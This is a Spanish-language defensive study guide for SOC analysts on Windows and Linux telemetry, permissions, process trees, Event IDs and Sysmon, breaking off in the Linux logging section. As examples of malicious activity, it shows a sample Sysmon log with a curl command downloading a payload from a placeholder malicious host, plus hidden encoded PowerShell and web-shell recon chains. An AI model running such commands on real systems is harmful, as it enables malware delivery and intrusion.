# Unidad 10 — Windows y Linux para Blue Team: administración, telemetría y triage

> **Ruta actual:** SOC Analyst L1 → Incident Response / DFIR  
> **Estado:** Guía de estudio integral y práctica defensiva.  
> **Nivel:** Inicial → Intermedio.  
> **Prerequisitos recomendados:** Redes básicas (TCP/IP, DNS) y uso elemental de terminales.  
> **Laboratorios asociados:** [Unidad 10 — Manual de laboratorios](../laboratorios/Unidad-10-LABORATORIOS.md).  
> **Propósito principal:** Comprender la arquitectura interna y la generación de eventos en Windows y Linux para validar alertas, reducir la superficie de ataque, realizar investigaciones efectivas y preservar evidencias sin alterarlas.

---

## Esta unidad es crucial?

En el trabajo diario de un analista de SOC o respondedor de incidentes, **los endpoints son el campo de batalla principal**. Las herramientas automáticas (SIEM, EDR, Antivirus) emiten alertas constantemente, pero los datos crudos no mienten: residen en los registros de eventos, los espacios de memoria, las relaciones de procesos y las conexiones activas de red. 

Aprender la administración y telemetría de Windows y Linux no es aprender a usar comandos de memoria; es entrenar la intuición para responder a la pregunta fundamental del analista: **¿Esto que estoy viendo es el comportamiento normal del sistema o una anomalía sospechosa?**

### Lista General de Autoevaluación

| Competencia Defensiva | Estudiado | Practicado | Demostrado |
|---|:---:|:---:|:---:|
| **1. Arquitectura, Procesos y Permisos** (SIDs/UIDs, Kernel vs. User) | [ ] | [ ] | [ ] |
| **2. Lenguajes de Comando Defensivos** (PowerShell & Bash estructurado) | [ ] | [ ] | [ ] |
| **3. Auditoría e Event Logs en Windows** (Event IDs de Seguridad) | [ ] | [ ] | [ ] |
| **4. Telemetría Avanzada con Sysmon** (Padre-Hijo, Process GUIDs, DNS) | [ ] | [ ] | [ ] |
| **5. Registros de Auditoría en Linux** (journald, syslog y auditd) | [ ] | [ ] | [ ] |
| **6. Identificación de Persistencia** (Tasks, Services, Cron, Timers) | [ ] | [ ] | [ ] |
| **7. Preservación y Evidencia Forense** (Hashes, MACB, Cadena de custodia) | [ ] | [ ] | [ ] |
| **8. Triage SOC y Análisis de Causa Raíz** (Líneas temporales y ATT&CK) | [ ] | [ ] | [ ] |

>Obviamente tenes que ejecutár todas las pruebas **únicamente** en sistemas propios o autorizados expresamente por escrito. No publiques IPs privadas reales, credenciales, hashes de contraseñas de producción o datos de clientes. Las muestras y logs que presento en esta guía son puramente con la idea de usarlos como ejemplo.

---

## Índice General

- [Unidad 10 — Windows y Linux para Blue Team: administración, telemetría y triage](#unidad-10--windows-y-linux-para-blue-team-administración-telemetría-y-triage)
  - [Esta unidad es crucial?](#esta-unidad-es-crucial)
    - [Lista General de Autoevaluación](#lista-general-de-autoevaluación)
  - [Índice General](#índice-general)
  - [1. Mapa mental: sistemas operativos y SOC](#1-mapa-mental-sistemas-operativos-y-soc)
    - [Vocabulario necesario de explicar](#vocabulario-necesario-de-explicar)
  - [2. Arquitectura del Sistema Operativo](#2-arquitectura-del-sistema-operativo)
    - [2.1 Kernel vs. Espacio de Usuario](#21-kernel-vs-espacio-de-usuario)
    - [2.2 Procesos, Hilos y Memoria Virtual](#22-procesos-hilos-y-memoria-virtual)
    - [2.3 Arranque, Sesiones y Contexto de Ejecución](#23-arranque-sesiones-y-contexto-de-ejecución)
    - [2.4 Matriz Comparativa de Artefactos](#24-matriz-comparativa-de-artefactos)
  - [3. Identidades, Grupos y Privilegios](#3-identidades-grupos-y-privilegios)
    - [3.1 Windows: SIDs, Tokens y UAC](#31-windows-sids-tokens-y-uac)
      - [Tokens de Acceso (Access Tokens)](#tokens-de-acceso-access-tokens)
      - [Control de Cuentas de Usuario (UAC - User Account Control)](#control-de-cuentas-de-usuario-uac---user-account-control)
    - [3.2 Linux: UIDs, GID, SUID y sudo](#32-linux-uids-gid-suid-y-sudo)
      - [Permisos Especiales: SUID y SGID](#permisos-especiales-suid-y-sgid)
      - [Control con sudo](#control-con-sudo)
    - [3.3 Aplicación Práctica del Mínimo Privilegio](#33-aplicación-práctica-del-mínimo-privilegio)
  - [4. Sistema de Archivos y Permisos Defensivos](#4-sistema-de-archivos-y-permisos-defensivos)
    - [4.1 Windows: NTFS, DACLs y SACLs](#41-windows-ntfs-dacls-y-sacls)
    - [4.2 Linux: Permisos Tradicionales (POSIX) y ACLs Extendidas](#42-linux-permisos-tradicionales-posix-y-acls-extendidas)
      - [ACLs Extendidas en Linux](#acls-extendidas-en-linux)
  - [5. Análisis de Procesos y Relaciones Padre-Hijo](#5-análisis-de-procesos-y-relaciones-padre-hijo)
    - [5.1 Análisis de Procesos en Windows](#51-análisis-de-procesos-en-windows)
    - [5.2 Análisis de Procesos en Linux](#52-análisis-de-procesos-en-linux)
    - [5.3 Casos Prácticos de Cadenas de Procesos Anómalas](#53-casos-prácticos-de-cadenas-de-procesos-anómalas)
  - [6. Servicios y Mecanismos de Inicio](#6-servicios-y-mecanismos-de-inicio)
    - [6.1 Servicios en Windows y SCM](#61-servicios-en-windows-y-scm)
    - [6.2 Unidades de systemd en Linux](#62-unidades-de-systemd-en-linux)
  - [7. Inspección de Red desde el Endpoint](#7-inspección-de-red-desde-el-endpoint)
    - [7.1 Correlación Red-Proceso en Windows](#71-correlación-red-proceso-en-windows)
    - [7.2 Correlación Red-Proceso en Linux](#72-correlación-red-proceso-en-linux)
    - [7.3 Guía de Análisis e Interpretación Defensiva](#73-guía-de-análisis-e-interpretación-defensiva)
  - [8. PowerShell Estructurado para Analistas SOC](#8-powershell-estructurado-para-analistas-soc)
    - [Estructura de la Tubería (Pipeline)](#estructura-de-la-tubería-pipeline)
  - [9. Bash y Terminal Linux para Triage de Logs](#9-bash-y-terminal-linux-para-triage-de-logs)
    - [9.1 Filtrado de logs de texto](#91-filtrado-de-logs-de-texto)
    - [9.2 Manejo Estándar de Timestamps y Zonas Horarias](#92-manejo-estándar-de-timestamps-y-zonas-horarias)
  - [10. Event Logs y Auditoría en Windows](#10-event-logs-y-auditoría-en-windows)
    - [10.1 Canales Principales y Ubicación](#101-canales-principales-y-ubicación)
    - [10.2 Guía de Event IDs Imprescindibles](#102-guía-de-event-ids-imprescindibles)
    - [10.3 Desglose de Tipos de Logon (4624)](#103-desglose-de-tipos-de-logon-4624)
  - [11. Telemetría Profunda con Sysmon](#11-telemetría-profunda-con-sysmon)
    - [11.1 Eventos Críticos de Sysmon](#111-eventos-críticos-de-sysmon)
    - [11.2 Ejemplo Real de Correlación Multi-Evento](#112-ejemplo-real-de-correlación-multi-evento)
  - [12. Logs y Auditoría en Linux](#12-logs-y-auditoría-en-linux)
    - [12.1 journald, syslog y Auth Logs](#121-journald-syslog-y-auth-logs)
    - [12.2 Sistema de Auditoría de Kernel (auditd)](#122-sistema-de-auditoría-de-kernel-auditd)
    - [12.3 Caso Práctico: Desglose de un Intento de Brute Force SSH](#123-caso-práctico-desglose-de-un-intento-de-brute-force-ssh)
  - [13. Análisis de Mecanismos de Persistencia](#13-análisis-de-mecanismos-de-persistencia)
  - [14. Hardening, Reducción de Superficie y Respuesta](#14-hardening-reducción-de-superficie-y-respuesta)
    - [Matriz de Controles Preventivos vs. Detección vs. Respuesta](#matriz-de-controles-preventivos-vs-detección-vs-respuesta)
  - [15. Fundamentos Forenses (DFIR) y Cadena de Custodia](#15-fundamentos-forenses-dfir-y-cadena-de-custodia)
    - [15.1 Orden de Volatilidad (RFC 3227)](#151-orden-de-volatilidad-rfc-3227)
    - [15.2 Identificadores Criptográficos (Hashes)](#152-identificadores-criptográficos-hashes)
    - [15.3 Registro de Cadena de Custodia](#153-registro-de-cadena-de-custodia)
    - [15.4 Timestamps y Análisis MACB](#154-timestamps-y-análisis-macb)
  - [16. Metodología de Triage SOC Paso a Paso](#16-metodología-de-triage-soc-paso-a-paso)
    - [16.1 Flujo Operativo](#161-flujo-operativo)
    - [16.2 Plantilla Profesional de Informe de Caso](#162-plantilla-profesional-de-informe-de-caso)
    - [16.3 Uso Correcto del Marco MITRE ATT\&CK](#163-uso-correcto-del-marco-mitre-attck)
  - [17. Errores Comunes del Analista Junior](#17-errores-comunes-del-analista-junior)
  - [18. Glosario y Fuentes Primarias](#18-glosario-y-fuentes-primarias)
    - [Fuentes Primarias y Documentación Oficial](#fuentes-primarias-y-documentación-oficial)

---

## 1. Mapa mental: sistemas operativos y SOC

Toda acción en un sistema operativo —sea legítima o maliciosa— deja una huella digital. Cuando un usuario abre un programa, un proceso se inicia en memoria, se le asigna un token de seguridad, lee archivos del disco, realiza consultas DNS y abre puertos de red.

El trabajo del analista de SOC no es memorizar alertas, sino comprender esta cadena de causa y efecto.

```text
[ Actor / Servicio ]
        │  (Autenticación)
        ▼
[ Token de Identidad / Privilegios ] ─── (Crea / Manipula)
        │
        ├──► [ Proceso Padre ] ───► [ Proceso Hijo ]
        │         │                      │
        │         ├──► Carga DLLs        ├──► Modifica Registro / Filesystem
        │         └──► Genera Tareas     └──► Inicia Conexión de Red (IP/DNS)
        │
        ▼
[ Capa de Auditoría y Telemetría ]
 (Security Logs, Sysmon, auditd, journald)
        │
        ▼
[ Investigación SOC ]
 HECHO (¿Qué pasó?) ──► CONTEXTO (¿Es normal?) ──► HIPÓTESIS (¿Es amenaza?)
```

### Vocabulario necesario de explicar

- **Evento:** Registro atómico de una acción observada en el sistema (ej. *Proceso iniciado*).
- **Telemetría:** Flujo continuo de eventos recolectados para monitorizar comportamiento.
- **Alerta:** Disparo generado por una regla de detección previa (ej. *PowerShell descargando ejecutable*).
- **Incidente:** Confirmación de que una o más alertas representan un impacto real o potencial sobre la confidencialidad, integridad o disponibilidad.
- **Triage:** Proceso inicial de priorización, análisis sintomático, correlación e investigación rápida de una alerta.
- **Baseline (Línea Base):** El patrón de comportamiento normal esperado dentro de una organización o sistema específico.

---

## 2. Arquitectura del Sistema Operativo

### 2.1 Kernel vs. Espacio de Usuario

El **Kernel (Núcleo)** es el componente central del sistema operativo. funciona con el máximo nivel de privilegio del hardware (Ring 0) y controla directamente la memoria física, los tiempos del procesador y los dispositivos de entrada/salida.

Las **Aplicaciones del Espacio de Usuario (Userland)** corren con privilegios restringidos (Ring 3). Cuando un programa (como un navegador o script) necesita acceder al disco o a la red, **no puede hacerlo directamente**: debe solicitarlo al kernel mediante una **Llamada al Sistema (Syscall)** en Linux o mediante la **API de Win32/Native API** en Windows.

```text
+------------------------------------------------------------------+
|                   ESPACIO DE USUARIO (Ring 3)                     |
|  [Navegador Web]      [Agente EDR]      [CMD / PowerShell / Bash] |
+------------------------------------------------------------------+
                                │  ▲
          Llamadas a API / Syscalls (e.g., NtCreateFile, read, write)
                                ▼  │
+------------------------------------------------------------------+
|                     ESPACIO DEL KERNEL (Ring 0)                   |
|  [Gestor de Memoria]   [Planificador (Scheduler)]   [Drivers]    |
|  [Filtros de Seguridad (Minifilters / eBPF)]                     |
+------------------------------------------------------------------+
                                │  ▲
                                ▼  │
+------------------------------------------------------------------+
|                        HARDWARE FÍSICO                            |
|             [CPU]          [RAM]          [Disco / Red]          |
+------------------------------------------------------------------+
```

> **Perspectiva defensiva:**  
> Si un malware logra ejecutar código dentro del Kernel (por ejemplo, explotando un controlador/driver vulnerable), puede ocultar sus procesos, manipular la telemetría del EDR y tomar control total del sistema. Por eso, monitorear la carga de drivers firmados y no firmados es crucial.

### 2.2 Procesos, Hilos y Memoria Virtual

- **Programa:** Código estático almacenado en el disco (ejemplo: `C:\Windows\System32\cmd.exe`).
- **Proceso:** Una instancia viva en ejecución de ese programa. Posee su propio espacio de direcciones de memoria virtual, un conjunto de descriptores de archivos/handles y credenciales asignadas.
- **Hilo (Thread):** La unidad mínima de ejecución dentro de un proceso. Un proceso puede tener múltiples hilos ejecutando tareas en paralelo.
- **PID (Process ID):** Identificador numérico que el SO asigna a un proceso vivo. **Atención:** Los PIDs se reciclan rápidamente. Un PID 1024 visto a las 09:00 AM puede pertenecer a un ejecutable completamente distinto a las 09:05 AM.
- **PPID (Parent Process ID):** Identificador del proceso que dio origen (padre) al proceso actual.
- **Memoria Virtual:** Mapeo abstracto que da a cada proceso la ilusión de tener un bloque de memoria contiguo y privado, aislando unos procesos de otros.

### 2.3 Arranque, Sesiones y Contexto de Ejecución

Cuando el sistema arranca, se inician los procesos core del sistema antes de que ningún usuario ingrese sus credenciales:

- **En Windows:** `smss.exe` (Session Manager), `wininit.exe`, `services.exe` (Service Control Manager) y `lsass.exe` (Local Security Authority Subsystem Service).
- **En Linux:** El proceso Kernel inicia `init` o `systemd` (PID 1), el cual se encarga de montar los sistemas de archivos y levantar los daemons de fondo.

Cada proceso se ejecuta bajo un **Contexto de Seguridad** determinado:
- En Windows: `NT AUTHORITY\SYSTEM` (máximo privilegio local), `NT AUTHORITY\LOCAL SERVICE`, `NT AUTHORITY\NETWORK SERVICE`, o cuentas de usuario interactivo/dominio.
- En Linux: `root` (UID 0), usuarios de servicios de sistema (ej. `www-data`, `systemd-resolve`), o usuarios estándar.

### 2.4 Matriz Comparativa de Artefactos

| Categoría Forense | Artefactos Clave en Windows | Artefactos Clave en Linux |
|---|---|---|
| **Autenticación** | Event Log `Security.evtx` (IDs 4624, 4625), proceso `lsass.exe`. | `/var/log/auth.log`, `/var/log/secure`, comandos `last`, `faillog`. |
| **Ejecución y Procesos** | Prefetch (`.pf`), Shimcache, Amcache, Sysmon Event 1, Event ID 4688. | Sistema `/proc/`, `auditd` (eventos `EXECVE`), `journalctl`. |
| **Persistencia** | Registro (Claves `Run`/`RunOnce`), Servicios, Tareas Programadas, WMI. | Cron jobs (`/etc/cron*`), Unidades `systemd` (`.timer`), `.bashrc`. |
| **Actividad de Red** | Tabla de conexiones TCP/UDP, Sysmon Event 3 y Event 22 (DNS). | Comandos `ss`, `netstat`, `/proc/net/tcp`, logs de firewall (iptables/nftables). |
| **Modificación de Archivos** | MFT ($MFT), USN Journal ($LogFile), Sysmon Event 11. | Inodos del File System, `auditd` (watches en archivos), logs de FIM. |

---

## 3. Identidades, Grupos y Privilegios

### 3.1 Windows: SIDs, Tokens y UAC

Windows **no** identifica permisos basándose en los nombres de usuario (que pueden cambiar o traducirse), sino mediante **SIDs (Security Identifiers)**.

Un SID tiene la siguiente estructura general: `S-1-5-21-XXXXX-XXXXX-XXXXX-RID`
- `S-1-5-21`: Identifica que es una cuenta emitida por un dominio o equipo local.
- `RID (Relative Identifier):` Identificador relativo. RIDs bien conocidos:
  - `-500`: Administrador Local integrado.
  - `-501`: Invitado.
  - `-512`: Administradores del Dominio.
  - `-513`: Usuarios del Dominio.

#### Tokens de Acceso (Access Tokens)
Cuando un usuario inicia sesión, Windows crea un **Access Token**. Este token actúa como un carnet de identidad digital que incluye:
1. El SID del usuario.
2. Los SIDs de todos los grupos a los que pertenece.
3. Los Privilegios del sistema asignados (ejemplo: `SeDebugPrivilege`, `SeBackupPrivilege`).

#### Control de Cuentas de Usuario (UAC - User Account Control)
UAC evita que las aplicaciones se ejecuten con privilegios administrativos completos de manera predeterminada. Cuando un Administrador inicia sesión, se le otorgan **dos tokens**: un token filtrado de usuario estándar y un token elevado. Para ejecutar tareas administrativas, el usuario debe aprobar la elevación mediante la consola UAC.

**Inspección de privilegios en PowerShell:**

```powershell
# Muestra el usuario actual y su SID
whoami /user

# Muestra los grupos a los que pertenece la sesión activa
whoami /groups

# Muestra los privilegios asignados y su estado (Enabled/Disabled)
whoami /priv

# Lista los miembros del grupo Administradores local
Get-LocalGroupMember -Group "Administrators" -ErrorAction SilentlyContinue
```

### 3.2 Linux: UIDs, GID, SUID y sudo

En Linux, la identidad se maneja mediante identificadores numéricos simples:
- **UID 0:** Reservado exclusivamente para `root` (acceso irrestricto al sistema).
- **UIDs 1–999:** Reservados para cuentas del sistema/daemons (`nobody`, `www-data`, `sshd`).
- **UIDs 1000+:** Cuentas de usuarios humanos estándar.

#### Permisos Especiales: SUID y SGID
- **SUID (Set User ID):** Si un archivo ejecutable tiene activado el bit SUID (`-rwsr-xr-x`), se ejecutará con los privilegios del **propietario del archivo** y no con los de quien lo lanza.
  - *Ejemplo legítimo:* `/usr/bin/passwd` tiene SUID root para permitir a usuarios cambiar su contraseña modificando `/etc/shadow`.
  - *Peligro de seguridad:* Si un binario vulnerable o configurable (como `find` o `vim`) tiene bit SUID root, un atacante puede usarlo para escalar privilegios.

#### Control con sudo
El comando `sudo` (Superuser Do) permite delegar la ejecución de comandos específicos con privilegios de root según lo configurado en `/etc/sudoers`.

```bash
# Verificar UID, GID y grupos del usuario activo
id

# Muestra los privilegios asignados por sudo para el usuario actual
sudo -l

# Buscar binarios con bit SUID activado pertenecientes a root
find / -perm -4000 -user root -type f 2>/dev/null
```

### 3.3 Aplicación Práctica del Mínimo Privilegio

El **Principio de Mínimo Privilegio (PoLP)** establece que todo proceso, usuario o servicio debe tener únicamente los permisos estrictamente necesarios para cumplir su función, y nada más.

> **Preguntas de Triage para el Analista:**
> 1. ¿Por qué el proceso de un servicio web (`www-data` o `IIS_IUSRS`) está ejecutando un shell como `bash` o `powershell.exe`?
> 2. ¿Por qué una cuenta de usuario estándar figura asignada al grupo `Administrators` o `wheel` desde hace 20 minutos?
> 3. ¿El comando elevado utilizado coincide con una tarea de mantenimiento o un ticket de soporte registrado?

---

## 4. Sistema de Archivos y Permisos Defensivos

### 4.1 Windows: NTFS, DACLs y SACLs

El sistema de archivos NTFS maneja la seguridad mediante dos tipos de listas en la Descriptora de Seguridad de cada archivo o carpeta:

1. **DACL (Discretionary Access Control List):** Define **quién** tiene permiso de acceso (Lectura, Escritura, Control Total) y quién lo tiene denegado. Se compone de entradas **ACE (Access Control Elements)**.
2. **SACL (System Access Control List):** Define **qué acciones deben ser auditadas** en los Event Logs cuando un usuario interactúa con el objeto (ejemplo: auditar cada vez que alguien intente eliminar un archivo crítico).

```powershell
# Inspeccionar la DACL de una carpeta específica
Get-Acl -Path "C:\Windows\System32\drivers\etc\hosts" | Format-List

# Calcular el Hash SHA-256 de un ejecutable o muestra
Get-FileHash -Path "C:\Windows\System32\cmd.exe" -Algorithm SHA256
```

### 4.2 Linux: Permisos Tradicionales (POSIX) y ACLs Extendidas

Los permisos estándar en Linux dividen los accesos en tres clases de usuarios: **Dueño (u)**, **Grupo (g)** y **Otros (o)**.

```text
  Tipo de archivo (-=archivo, d=directorio, l=enlace)
  │
  ▼
  -  r w x  r - x  r - -  1 analista soc  4096 oct 20 12:00 script.sh
     │ │ │  │ │ │  │ │ │
     └──┬──┘└──┬──┘└──┬──┘
        │      │      └── Permisos de Otros (o): Lectura
        │      └───────── Permisos de Grupo (g): Lectura y Ejecución
        └──────────────── Permisos de Dueño (u): Lectura, Escritura y Ejecución
```

#### ACLs Extendidas en Linux
Cuando los permisos tradicionales `rwx` no son suficientes para esquemas complejos, se utilizan las ACLs de POSIX:

```bash
# Ver permisos extendidos y propietario detallado
getfacl /var/log/syslog

# Ver información ampliada del archivo (Inodo, Acceso, Modificación, Cambio)
stat /etc/passwd

# Generar el Hash SHA-256 de un archivo para control de integridad
sha256sum /etc/passwd
```

---

## 5. Análisis de Procesos y Relaciones Padre-Hijo

### 5.1 Análisis de Procesos en Windows

En Windows, los procesos no nacen aislados. Salvo el proceso `System` (PID 4), **todo proceso es creado por otro proceso padre**. Entender las relaciones naturales padre-hijo es una de las herramientas más potentes del Blue Team.

```powershell
# Listar los procesos en ejecución mostrando PID, PPID, Nombre y Línea de Comandos
Get-CimInstance Win32_Process | 
  Select-Object ProcessId, ParentProcessId, Name, CommandLine | 
  Format-Table -AutoSize
```

### 5.2 Análisis de Procesos en Linux

En Linux, el árbol de procesos nace desde `systemd` (PID 1). Los procesos se clonan mediante la syscall `fork()` y ejecutan nuevos binarios mediante `execve()`.

```bash
# Ver el árbol gráfico de procesos con sus PIDs
pstree -acps

# Listar procesos detallando PID, PPID, Usuario y Comando completo
ps -eo pid,ppid,user,lstart,cmd --sort=-pid | head -n 20
```

### 5.3 Casos Prácticos de Cadenas de Procesos Anómalas

A continuación se presentan patrones reales de cadenas de procesos que deben levantar sospechas inmediatas durante un triage:

```text
[ Caso Anómalo 1: Phishing y ejecución de código ]
WINWORD.EXE (Microsoft Word)
   └── cmd.exe /c powershell.exe -NOP -W Hidden -Enc aXZ4...
          └── powershell.exe
                 └── conhost.exe

Análisis: Un documento de procesamiento de texto NO debería invocar intérpretes de comandos para ejecutar scripts ocultos codificados en Base64.
```

```text
[ Caso Anómalo 2: Compromiso de Servidor Web (Web Shell) ]
w3wp.exe (IIS)  o  httpd / nginx (Linux)
   └── cmd.exe  o  /bin/sh
          └── whoami / net user / ipconfig / id

Análisis: Un proceso de servicio web respondiendo peticiones HTTP nunca debería engendrar una consola interactiva ejecutando comandos de reconocimiento.
```

---

## 6. Servicios y Mecanismos de Inicio

### 6.1 Servicios en Windows y SCM

El **Service Control Manager (SCM)** administra los servicios que corren en segundo plano. Los atacantes suelen crear nuevos servicios o modificar las rutas de binarios de servicios existentes para lograr persistencia con privilegios `SYSTEM`.

```powershell
# Listar servicios mostrando el nombre, estado y la ruta exacta del ejecutable
Get-CimInstance Win32_Service | 
  Select-Object Name, State, StartMode, PathName | 
  Where-Object { $_.State -eq 'Running' } | 
  Out-GridView
```

> **Puntos clave de inspección:**
> - Binarios de servicios ubicados en rutas temporales (`C:\Users\...\AppData\Local\Temp\` o `C:\Windows\Temp\`).
> - Rutas no entrecomilladas con espacios (Unquoted Service Paths).

### 6.2 Unidades de systemd en Linux

En las distribuciones modernas, `systemd` gestiona los servicios mediante archivos de configuración llamados **unidades (`.service`)**.

```bash
# Listar todos los servicios activos e iniciados
systemctl list-units --type=service --state=running

# Inspeccionar el archivo de configuración de un servicio específico
systemctl cat ssh.service
```

---

## 7. Inspección de Red desde el Endpoint

Correlacionar una conexión de red entrante o saliente con el **proceso específico** que la originó en el endpoint es fundamental para validar si se trata de tráfico legítimo o una sesión C2 (Command and Control).

### 7.1 Correlación Red-Proceso en Windows

```powershell
# Obtener conexiones TCP activas asociadas al PID y nombre del proceso
Get-NetTCPConnection | 
  Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess,
                @{Name="ProcessName"; Expression={(Get-Process -Id $_.OwningProcess).ProcessName}} |
  Where-Object { $_.State -eq 'Established' } | 
  Format-Table -AutoSize
```

### 7.2 Correlación Red-Proceso en Linux

```bash
# Muestra sockets TCP/UDP escuchando o conectados con el nombre y PID del proceso responsable
sudo ss -tupnA

# Ver qué procesos están manteniendo puertos abiertos en escucha
sudo lsof -i -P -n | grep LISTEN
```

### 7.3 Guía de Análisis e Interpretación Defensiva

```text
+---------------------+------------------------------------------------------------------+
| Situación Observada | Interpretación / Pasos de Triage Recomendados                    |
+---------------------+------------------------------------------------------------------+
| Puerto 4444/LISTEN  | Altamente sospechoso. Puerto por defecto de frameworks como      |
| en IP 0.0.0.0       | Metasploit. Identificar PID de inmediato y aislar proceso.       |
+---------------------+------------------------------------------------------------------+
| Conexión HTTPS hacia| Normal si pertenece a un navegador web. Anómalo si el proceso     |
| IP externa          | origen es `rundll32.exe`, `regsvr32.exe` o `certutil.exe`.      |
+---------------------+------------------------------------------------------------------+
| Conexión a IP por   | Verificar si la IP pertenece a infraestructura CDN/Cloud (AWS,   |
| reputación / GeoIP  | Azure) antes de marcar como incidente. Validar por proceso.      |
+---------------------+------------------------------------------------------------------+
```

---

## 8. PowerShell Estructurado para Analistas SOC

PowerShell **no es un lenguaje basado en texto plano**, sino en **Objetos .NET**. Esto significa que no necesitamos parsear cadenas con expresiones regulares complejas para extraer campos específicos: podemos filtrar directamente por sus propiedades.

### Estructura de la Tubería (Pipeline)
El flujo estándar de trabajo defensivo en PowerShell sigue este patrón:
`Comando-Obtener | Filtrar-Condición | Seleccionar-Campos | Ordenar | Exportar`

```powershell
# Ejemplo práctico: Buscar eventos de error o falla en el log de Sistema
Get-WinEvent -LogName System -MaxEvents 100 | 
  Where-Object { $_.LevelDisplayName -eq 'Error' } | 
  Select-Object TimeCreated, Id, ProviderName, Message | 
  Export-Csv -Path ".\System_Errors.csv" -NoTypeInformation -Encoding UTF8
```

---

## 9. Bash y Terminal Linux para Triage de Logs

A diferencia de PowerShell, el entorno Bash procesa **flujos de texto y bytes (stdout, stderr)**. Dominar herramientas de filtrado de texto rápido es vital para analizar rápidamente megabytes de archivos de registro.

### 9.1 Filtrado de logs de texto

```bash
# 1. Filtrar intentos de inicio de sesión SSH fallidos
grep "Failed password" /var/log/auth.log

# 2. Contar y ordenar las IPs con más intentos fallidos
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr

# 3. Parsear logs JSON modernos usando 'jq'
cat /var/log/suricata/eve.json | jq 'select(.event_type=="dns") | {timestamp: .timestamp, query: .dns.rrname}'
```

### 9.2 Manejo Estándar de Timestamps y Zonas Horarias

Uno de los errores más graves en investigaciones forenses es **mezclar zonas horarias** al reconstruir una línea de tiempo.

> Siempre:  
> Conservá siempre los registros con su fecha/hora original y convertí todos los eventos a **UTC (Coordinated Universal Time)** en tu reporte final.

```bash
# Ver hora actual en formato ISO-8601 estandarizado
date --iso-8601=seconds

# Ver la configuración del reloj del sistema y estado de sincronización NTP
timedatectl
```

---

## 10. Event Logs y Auditoría en Windows

### 10.1 Canales Principales y Ubicación

Los registros de Windows se guardan en formato binario estructurado (`.evtx`) en la ruta: `C:\Windows\System32\winevt\Logs\`.

- **Security (`Security.evtx`):** Almacena eventos de autenticación, uso de privilegios y gestión de cuentas.
- **System (`System.evtx`):** Registra eventos de drivers, fallos de hardware y cambios en servicios del sistema.
- **Application (`Application.evtx`):** Eventos generados por programas de terceros y aplicaciones instaladas.
- **PowerShell (`Microsoft-Windows-PowerShell/Operational.evtx`):** Muestra la ejecución de scripts y comandos (Script Block Logging - Event ID 4104).

### 10.2 Guía de Event IDs Imprescindibles

| Event ID | Canal | Descripción / Qué buscar |
|:---:|:---:|---|
| **4624** | Security | **Inicio de sesión exitoso.** Verificar Tipo de Logon, Usuario y Origen. |
| **4625** | Security | **Inicio de sesión fallido.** Revisar código de sub-error e IP de origen. |
| **4672** | Security | **Asignación de privilegios especiales.** Ocurre cuando se loguea un Administrador. |
| **4688** | Security | **Creación de un proceso.** Requiere activar "Incluir línea de comandos en eventos". |
| **4697** | Security | **Un servicio fue instalado en el sistema.** Inspeccionar la ruta del ejecutable. |
| **4698** | Security | **Una Tarea Programada fue creada.** Revisar la acción asignada y el creador. |
| **4720** | Security | **Se creó una cuenta de usuario local.** |
| **1102** | Security | **El registro de auditoría de seguridad fue borrado.** (Alerta de alta severidad). |

### 10.3 Desglose de Tipos de Logon (4624)

Al analizar un Evento 4624, el campo **Logon Type (Tipo de Inicio de Sesión)** indica *cómo* accedió el usuario:

- **Tipo 2 (Interactive):** El usuario se logueó localmente utilizando el teclado y monitor físico del equipo.
- **Tipo 3 (Network):** Acceso a recursos compartidos a través de la red (ej. carpetas compartidas SMB, llamadas RPC).
- **Tipo 4 (Batch):** Un proceso en lote o tarea programada ejecutándose en nombre de un usuario.
- **Tipo 5 (Service):** Un servicio del sistema iniciándose con su cuenta configurada.
- **Tipo 7 (Unlock):** El usuario desbloqueó la pantalla del equipo.
- **Tipo 10 (RemoteInteractive / RDP):** Inicio de sesión remoto mediante Escritorio Remoto (RDP) o TS.

---

## 11. Telemetría Profunda con Sysmon

System Monitor (**Sysmon**) es un servicio y controlador de Windows (Sysinternals) que permanece activo tras los reinicios para monitorear y registrar la actividad del sistema en el Event Log (`Microsoft-Windows-Sysmon/Operational`).

> Sysmon **no bloquea ni previene** amenazas por sí solo; es una herramienta pura de **telemetría y visibilidad**.

### 11.1 Eventos Críticos de Sysmon

```text
+----------+----------------------------------+-------------------------------------------------+
| Event ID | Nombre del Evento                | Utilidad Principal de Investigación             |
+----------+----------------------------------+-------------------------------------------------+
| Event 1  | Process Creation                | Registra ProcessGuid, ParentProcessGuid y Hash. |
| Event 3  | Network Connection               | Muestra qué IP/Puerto conectó un proceso dado. |
| Event 7  | Image Loaded (DLLs)              | Detecta DLL Hijacking o inyección de código.    |
| Event 8  | CreateRemoteThread               | Inyección de código en otros procesos (LSASS).  |
| Event 11 | FileCreate                       | Muestra la creación de ejecutables o webshells. |
| Event 13 | RegistryEvent (Value Set)        | Detecta cambios en claves de inicio autostart.  |
| Event 22 | DNSEvent (DNS Query)             | Registra la consulta de dominio exacta por PID. |
+----------+----------------------------------+-------------------------------------------------+
```

### 11.2 Ejemplo Real de Correlación Multi-Evento

Gracias a que Sysmon asigna un identificador único global (`ProcessGuid`) a cada proceso, podemos enlazar múltiples eventos a lo largo del tiempo:

```text
[Sysmon Event 1 - 10:00:01 AM]
  Process: C:\Windows\System32\cmd.exe
  ProcessGuid: {A1B2C3D4-1111-2222-3333-444455556666}
  CommandLine: cmd.exe /c curl http://malicious-site.com/payload.exe -o C:\Users\Public\payload.exe

[Sysmon Event 22 - 10:00:02 AM]
  ProcessGuid: {A1B2C3D4-1111-2222-3333-444455556666}
  QueryName: malicious-site.com

[Sysmon Event 11 - 10:00:03 AM]
  ProcessGuid: {A1B2C3D4-1111-2222-3333-444455556666}
  TargetFilename: C:\Users\Public\payload.exe

[Sysmon Event 1 - 10:00:05 AM]
  ParentProcessGuid: {A1B2C3D4-1111-2222-3333-444455556666}
  Process: C:\Users\Public\payload.exe
```

---

## 12. Logs y Auditoría en Linux

### 12.1 journald, syslog y Auth Logs

En distribuciones basadas en `systemd`, el servicio `systemd-journald` recolecta mensajes de auditoría del kernel, logs de servicios y registros del sistema en formato binario.

```bash
# Consultar logs de autenticación de las últimas 2 horas
sudo journalctl -u ssh --since "2 hours ago" --no-pager

# Consultar logs con nivel de prioridad de advertencia para arriba
sudo journalctl -p warning..err -b
```

Archivos de texto tradicionales (gestionados por `rsyslog`):
- `/var/log/auth.log` (Debian/Ubuntu) o `/var/log/secure` (RHEL/CentOS): Autenticaciones y delegaciones de sudo.
